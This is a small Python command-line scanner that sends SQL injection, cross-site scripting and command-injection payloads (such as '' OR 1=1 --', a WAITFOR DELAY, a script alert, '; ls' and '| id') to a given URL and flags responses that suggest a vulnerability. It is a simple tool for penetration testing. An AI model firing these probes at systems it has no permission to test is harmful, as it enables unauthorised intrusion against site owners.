import argparse
import requests
import time
from bs4 import BeautifulSoup

# Common payloads for various injection types
SQL_PAYLOADS = ["'", "' OR 1=1 --", "' AND 1=2 --", "'; WAITFOR DELAY '0:0:5' --"]
XSS_PAYLOADS = ['<script>alert(1)</script>', '" onmouseover="alert(1)"']
CMD_PAYLOADS = ["; ls", "&& whoami", "| id"]

def test_sql_injection(url):
    print("[*] Testing SQL Injection...")
    for payload in SQL_PAYLOADS:
        full_url = url + payload
        start = time.time()
        response = requests.get(full_url)
        elapsed = time.time() - start
        if "error" in response.text.lower() or elapsed > 4:
            print(f"[+] Possible SQL Injection detected with payload: {payload}")
        else:
            print(f"[-] No injection detected with: {payload}")

def test_xss(url):
    print("[*] Testing XSS...")
    for payload in XSS_PAYLOADS:
        full_url = url + payload
        response = requests.get(full_url)
        soup = BeautifulSoup(response.text, 'html.parser')
        if payload in str(soup):
            print(f"[+] XSS vulnerability detected with payload: {payload}")
        else:
            print(f"[-] No XSS with: {payload}")

def test_cmd_injection(url):
    print("[*] Testing Command Injection...")
    for payload in CMD_PAYLOADS:
        full_url = url + payload
        response = requests.get(full_url)
        if "uid=" in response.text or "root" in response.text:
            print(f"[+] Command Injection suspected with: {payload}")
        else:
            print(f"[-] No command injection with: {payload}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Injection Tester")
    parser.add_argument("--url", required=True, help="Target URL (must include vulnerable param)")
    parser.add_argument("--technique", required=True, choices=["sql", "xss", "cmd"], help="Injection technique to test")
    args = parser.parse_args()

    if args.technique == "sql":
        test_sql_injection(args.url)
    elif args.technique == "xss":
        test_xss(args.url)
    elif args.technique == "cmd":
        test_cmd_injection(args.url)
